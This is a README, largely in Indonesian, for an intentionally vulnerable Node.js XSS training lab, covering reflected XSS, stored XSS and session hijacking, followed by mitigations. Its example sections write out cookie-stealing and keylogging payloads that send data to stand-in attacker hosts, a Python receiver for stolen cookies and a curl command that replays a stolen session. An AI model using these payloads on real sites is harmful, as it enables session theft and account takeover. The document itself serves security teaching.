# XSS Lab - Educational Cross-Site Scripting (XSS) Lab

Aplikasi pembelajaran interaktif untuk memahami dan praktik **Cross-Site Scripting (XSS)** vulnerabilities menggunakan Node.js, Express, dan SQLite.

## 🎯 Tujuan Edukasi

Lab ini dirancang untuk:

- Memahami tiga tipe utama XSS: **Reflected**, **Stored**, dan **Session Hijacking**
- Praktik teknik eksploitasi dalam lingkungan yang aman dan terkontrol
- Belajar cara mendeteksi dan mitigasi XSS vulnerabilities
- Menganalisis dampak keamanan aplikasi web yang tidak melakukan sanitasi input

## ⚠️ Disclaimer

**Aplikasi ini sengaja mengandung security vulnerabilities untuk tujuan edukasi.** Jangan gunakan di production atau public internet. Gunakan hanya dalam lingkungan lab terisolasi atau localhost.

---

## 🚀 Quick Start

### 1. Instalasi & Setup

```bash
# Install dependencies
npm install

# (Optional) Reset semua data & reseed posts
npm run reset

# (Optional) Seed posts only
npm run seed
```

### 2. Jalankan Aplikasi

```bash
# Mode production
npm start

# Mode development dengan auto-reload
npm run dev
```

Buka browser: **`http://localhost:3000`**

### 3. Login Akun Default

```
Username: admin
Password: admin
```

---

## 📁 Struktur Proyek

```
JavaScript/
├── server.js
│   ├── Express app & routes
│   ├── SQLite database & schema
│   ├── User authentication & session handling
│   └── Vulnerable endpoints (search, comments)
│
├── package.json                 # Dependencies & npm scripts
├── xss_lab.db                   # SQLite database (auto-generated)
│
├── scripts/
│   ├── seed_posts.js           # Seed default posts & admin user
│   └── reset_all.js            # Reset & reseed data
│
├── public/
│   ├── css/
│   │   └── style.css           # Modern UI dengan light/dark mode
│   ├── images/
│   │   ├── post1.jpg
│   │   ├── post2.jpg
│   │   └── post3.jpg
│   └── favicon.svg
│
└── README.md
```

---

## 🏗️ System Architecture

### Database Schema

**users** table:

```sql
id (INTEGER PRIMARY KEY)
username (TEXT UNIQUE)
password (TEXT, bcrypt hashed)
```

**posts** table:

```sql
id (INTEGER PRIMARY KEY)
title (TEXT)
content (TEXT)
image_path (TEXT)
```

**comments** table:

```sql
id (INTEGER PRIMARY KEY)
post_id (INTEGER)
user_id (INTEGER)
content (TEXT) -- VULNERABLE: tidak di-escape untuk stored XSS
```

### Authentication & Session

- Menggunakan `express-session` dengan SQLite session store
- Password di-hash dengan **bcrypt** (secure)
- Session cookie: `connect.sid`
  - **⚠️ httpOnly: false** (sengaja untuk demonstrasi session hijacking)
  - Accessible dari JavaScript client-side

---

## 🔓 Kerentanan yang Tersedia

### 1. **Reflected XSS** (Via Search Feature)

**Endpoint:** `GET /search?q=<payload>`

**Deskripsi:** Query search ditampilkan di halaman hasil **tanpa HTML sanitasi**

**Contoh Payload:**

```javascript
// Alert popup
<script>alert('Reflected XSS')</script>

// Steal cookies & redirect
<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">

// Keylogger
<script>
document.onkeypress = function(e) {
  fetch('http://attacker.com/log?key=' + e.key);
}
</script>
```

**How to Test:**

1. Buka: `http://localhost:3000/?q=<img src=x onerror="alert('XSS')">`
2. atau cari di search box: `<img src=x onerror="alert('XSS')">`
3. Script akan dijalankan saat halaman results dimuat

---

### 2. **Stored XSS** (Via Comments System)

**Endpoint:** `POST /comment` → stored di database

**Deskripsi:** Komentar pada post **tidak di-escape**, sehingga malicious script disimpan & dijalankan setiap kali halaman post dibuka

**Contoh Exploit:**

a) **Steal admin session cookie:**

```javascript
<img src=x onerror="fetch('/steal-cookies?cookie=' + document.cookie)">
```

b) **Auto-login redirect:**

```javascript
<script>
  // Fetch user profile via stolen session
  fetch('/profile')
    .then(r => r.text())
    .then(html => {
      // Send victim's profile to attacker
      fetch('http://attacker.com/log?profile=' + encodeURIComponent(html));
    });
</script>
```

c) **Page defacement:**

```javascript
<script>
  document.body.innerHTML = '<h1>Hacked! Your session is compromised.</h1>';
</script>
```

**How to Test:**

1. Login dengan akun (atau gunakan akun `admin/admin`)
2. Buka post apapun
3. Pada form komentar, input payload diatas
4. Kirim komentar → Script disimpan di database
5. Refresh halaman → Script dijalankan setiap kali ada yang buka post itu

---

### 3. **Session Hijacking** (Stealing admin Session)

**Vulnerability:** `connect.sid` cookie **tidak httpOnly** → bisa dicuri via XSS

**Skenario:**

1. Attacker post stored XSS payload di komentar
2. Admin membaca post tersebut
3. XSS payload dijalankan di browser admin
4. Cookie `connect.sid` admin dikirim ke attacker
5. Attacker dapat impersonate admin dengan cookie yang dicuri

**Contoh Exploit:**

```javascript
// Post as comment:
<script>
  // Steal admin's session cookie var adminCookie = document.cookie; // Send to
  attacker's server fetch('http://attacker.local:8888/steal?cookie=' +
  encodeURIComponent(adminCookie));
</script>
```

**Cara Hijack Session:**

```bash
# 1. Jalankan attacker server (di terminal lain)
python3 -m http.server 8888

# 2. Setelah dapet cookie dari XSS, gunakan untuk bypassauth:
curl -b "connect.sid=<stolen_cookie_value>" http://localhost:3000/profile

# Cookie yang dicuri bisa digunakan untuk akses sebagai user yang stolen cookienya
```

---

## 💡 Contoh Payload & Testing

### Testing Reflected XSS

```bash
# URL encoding payload
curl "http://localhost:3000/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E"

# Simple alert
?q=<script>alert('Reflected XSS')</script>

# Session cookie stealer
?q=<img src=x onerror="fetch('http://localhost:8888/?c='+document.cookie)">
```

### Testing Stored XSS (Comments)

1. **Login** dengan admin/admin
2. Buka post apapun (e.g., "Exploring XSS 101")
3. Input komentar:

```javascript
<img src=x onerror="alert('Stored XSS - payload tersimpan di database')">
```

4. Setiap kali post dibuka → alert muncul (sampai data direset)

### Testing Session Hijacking

```bash
# Terminal 1: Jalankan lab
npm start

# Terminal 2: Jalankan file receiver untuk catch stolen cookies
python3 << 'EOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        print(f"\n[*] Stolen Cookie: {query.get('cookie', ['No cookie'])}")
        print(f"[*] Full URL: {self.path}\n")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Cookie logged!")

HTTPServer(("0.0.0.0", 8888), Handler).serve_forever()
EOF

# Terminal 3: Post XSS payload as comment
# (klik post → input di comment form):
# <img src=x onerror="fetch('http://localhost:8888/?cookie='+document.cookie)">
```

---

## 🛡️ Mitigasi XSS

### 1. **Input Validation & Sanitization**

```javascript
// ❌ VULNERABLE
db.run("INSERT INTO comments (content) VALUES (?)", [userInput]);
// userInput bisa berisi <script> tags

// ✅ SECURE - Sanitize input
const sanitizeHtml = require("sanitize-html");
const cleanInput = sanitizeHtml(userInput, {
  allowedTags: [], // Tidak allow HTML tags apapun
  allowedAttributes: {},
});
```

### 2. **Output Encoding (HTML Escape)**

```javascript
// ❌ VULNERABLE
<p>${post.content}</p>

// ✅ SECURE
<p>${escapeHtml(post.content)}</p>

function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}
```

### 3. **Content Security Policy (CSP)**

```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self'"
/>
```

### 4. **Disable httpOnly Cookie (untuk Session Hijacking Prevention)**

```javascript
// ❌ VULNERABLE (current setting)
cookie: { httpOnly: false }

// ✅ SECURE
cookie: { httpOnly: true, secure: true }
```

---

## 📊 Data Management

### Reset Semua Data & Reseed

```bash
npm run reset
```

Ini akan:

1. Hapus semua comments
2. Hapus semua posts
3. Hapus semua users
4. Recreate admin user (admin/admin)
5. Reseed 10 default posts

### Seed Posts Only

```bash
npm run seed
```

---

## 🎮 Features Lab

### ✅ Fitur Saat Ini

- **Home Feed:** Display semua posts dengan preview
- **Post Detail:** Buka post lengkap & lihat comments
- **Stored XSS Lab:** Comment sistem dengan vulnerable storage
- **Reflected XSS Lab:** Search feature dengan unescaped query
- **User Profile:** Lihat profile yang login (dummy, untuk konteks)
- **Light/Dark Mode:** Toggle tema di header
- **Responsive Design:** Mobile & desktop friendly
- **Logo Clickable:** Click logo untuk back to home
- **Modern UI:** Inspirasi X.com dengan card-based layout

### Features Administratif

- Database auto-initialization
- Default admin user seeding
- Data reset script
- Session management

---

## 🔧 NPM Scripts

```bash
npm start                # Run production server
npm run dev             # Run dengan nodemon (auto-reload)
npm run seed            # Seed posts & admin user
npm run reset           # Reset all data + reseed
npm run reset-comments  # Legacy: delete comments only
```

---

## 🔐 Security Notes

| Feature                | Status        | Notes                                 |
| ---------------------- | ------------- | ------------------------------------- |
| **Input Sanitization** | ❌ Vulnerable | Sengaja untuk lab (XSS teaching)      |
| **Output Encoding**    | ⚠️ Partial    | Search & comments tidak di-escape     |
| **HTTPS**              | ❌ No         | Hanya HTTP (lab environment)          |
| **httpOnly Cookies**   | ❌ No         | Disabled untuk session hijacking demo |
| **CSRF Protection**    | ❌ No         | -                                     |
| **Rate Limiting**      | ❌ No         | -                                     |
| **SQL Injection**      | ✅ Protected  | Menggunakan parameterized queries     |
| **Bcrypt Passwords**   | ✅ Secure     | Hashing dengan salt rounds = 10       |

---

## 📚 Learning Resources

### Topik yang Bisa Dipelajari:

1. **Reflected XSS** - Search feature
2. **Stored XSS** - Comments system
3. **Session Hijacking** - Stealing non-httpOnly cookies
4. **Input Validation** - Form submissions
5. **Output Encoding** - HTML entity encoding
6. **OWASP Top 10** - A03:2021 Injection

### Recommended Payloads untuk Test:

```javascript
// 1. Simple alert (test XSS works)
<script>alert('XSS')</script>

// 2. Image with onerror (works even dengan filter sederhana)
<img src=x onerror=alert('XSS')>

// 3. SVG injection
<svg onload=alert('XSS')>

// 4. Event handler
<body onload=alert('XSS')>

// 5. Cookie stealer
<img src=x onerror="fetch('http://attacker:8888/?c='+document.cookie)">

// 6. DOM manipulation
<script>document.body.innerHTML='<h1>Hacked</h1>'</script>
```

---

## 🐛 Known Issues & Limitations

- No XSS filter/protection (intentional)
- Comments tidak ada pagination (bisa slow dengan banyak comments)
- No admin panel untuk moderate comments
- Search tidak berfungsi sebenarnya, hanya menampilkan query

---

## 📝 License

Educational Purpose Only. Gunakan untuk pembelajaran cybersecurity dalam environment yang terkontrol.

---

## 👨‍💻 Created For

XSS Lab JavaScript Version - Cybersecurity Education Platform
Node.js + Express + SQLite
